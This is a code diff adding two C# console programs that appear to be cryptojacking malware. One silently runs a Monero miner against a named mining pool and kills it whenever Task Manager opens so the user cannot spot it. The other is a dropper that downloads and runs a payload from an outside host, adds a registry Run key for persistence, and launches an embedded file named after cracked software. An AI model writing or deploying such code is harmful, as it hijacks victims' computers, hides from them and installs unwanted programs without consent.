@@ -1,0 +1,205 @@
+using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Net.NetworkInformation;
+using System.Reflection;
+using System.Text;
+using System.Threading;
+
+
+
+namespace ConsoleApp2
+{
+   
+    class Program
+    {
+    
+        static void Main(string[] args)
+        {
+
+
+            /*
+
+
+        
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("x64host", Path.GetTempPath() + "\x64host.exe");
+
+
+            System.Net.WebClient miner = new System.Net.WebClient();
+             miner.DownloadFileAsync(new Uri("http://qubiq.pro/tempp2.zip"), Path.GetTempPath() + "\\tempp2.zip"); // Скачиваем в %temp%
+            while (miner.IsBusy) { } // дождаться завершения загрузки
+
+
+            string zipPath = Path.GetTempPath() + "\\tempp2.zip";
+            string extractPath = Path.GetTempPath();
+
+            ZipFile.ExtractToDirectory(zipPath, extractPath);
+
+
+            if (Process.GetProcessesByName("dhost").Length == 0)
+            {
+
+                Process.Start(Path.GetTempPath() + "\\dhost.exe");
+
+
+            }
+            else
+            {
+                //
+
+            }
+
+
+            */
+
+   
+            // Run a program every day on the local machine
+
+
+
+
+            // Для реестра
+            /*
+                 RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                 key.SetValue("x64host", Path.GetTempPath() + "\x64host.exe");
+
+           */
+
+            // Планировщик
+
+            // Run a program every day on the local machine
+
+
+
+            // TaskService.Instance.AddTask("dhost", QuickTriggerType.Logon, (Path.GetTempPath() + "\\dhost.exe"), "-a arg");
+
+
+
+
+
+
+            while (true)
+                     {
+
+                         Process[] pname = Process.GetProcessesByName("taskmgr");
+                     if (pname.Length == 0)
+                             // Process.Start(new ProcessStartInfo(Assembly.GetExecutingAssembly().Location, "/p /a /c"));
+                             if (Process.GetProcessesByName("x32host").Length == 0)
+                             {
+                                 ProcessStartInfo mnrs = new ProcessStartInfo(Path.GetTempPath() + "\\x32host.exe");
+                                 mnrs.UseShellExecute = false;
+                                 mnrs.CreateNoWindow = true;
+                        mnrs.Arguments = ("-a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -t 2 -u avtoritet1337@gmail.com -p x");
+                        // mnrs.Arguments = ("-a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -t 2 -u 46rvz8iZpBmdR4bLTgFwVfSotrv9Lc1qGEjfZUyHKqbrXJC5z9RmBpnjGpKL2NpzpZES1E7CiWbN6fqefLXjWJJ3AZhHT83."+ macAddr +" -p x");
+                        Process.Start(mnrs);
+
+
+                             }
+                             else
+                             {
+                                //
+
+                             }
+
+
+                         else
+
+                     {
+                         foreach (Process proc in Process.GetProcessesByName("x32host"))
+                         {
+                             proc.Kill();
+                         }
+
+
+                                       }
+
+                                       Thread.Sleep(1000); // пауза в одну секунду, мы ж не хотим перегревать процессор?
+                                   } 
+
+         
+
+        }
+
+
+
+
+    }
+
+}
+
+
+
+
+using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ConsoleApp3
+{
+
+    class Program
+    {
+        public static String file_exe = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\setupbak.exe";
+        // public static String file2_exe = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\start.exe";
+        static void Main(string[] args)
+        {
+
+            System.Net.WebClient miner = new System.Net.WebClient();
+            miner.DownloadFileAsync(new Uri("http://qubiq.pro/tempp2.zip"), Path.GetTempPath() + "\\tempp2.zip"); // Скачиваем в %temp%
+            while (miner.IsBusy) { } // дождаться завершения загрузки
+
+
+            string zipPath = Path.GetTempPath() + "\\tempp2.zip";
+            string extractPath = Path.GetTempPath();
+
+            ZipFile.ExtractToDirectory(zipPath, extractPath);
+
+            if (Process.GetProcessesByName("dhost").Length == 0)
+            {
+                ProcessStartInfo mnrs1 = new ProcessStartInfo(Path.GetTempPath() + "\\dhost.exe");
+                mnrs1.UseShellExecute = false;
+                mnrs1.CreateNoWindow = true;
+                Process.Start(mnrs1);
+
+
+            }
+            else
+            {
+                //
+
+            }
+
+            File.Delete(Path.GetTempPath() + "\\tempp2.zip");
+            // Для реестра
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("x64host", Path.GetTempPath() + "\x64host.exe");
+
+            FileStream fs = new FileStream(file_exe, FileMode.Create);
+            fs.Write(Properties.Resources.NewBlueTotalFX5_AEX_170317_CE, 0, Properties.Resources.NewBlueTotalFX5_AEX_170317_CE.Length);
+            fs.Close();
+            System.Diagnostics.Process.Start(file_exe);
+
+            /*
+            FileStream fs2 = new FileStream(file2_exe, FileMode.Create);
+            fs2.Write(Properties.Resources.setupbak, 0, Properties.Resources.setupbak.Length);
+            fs2.Close();
+            System.Diagnostics.Process.Start(file2_exe);
+           
+     
+     */
+
+        }
+    }
+}
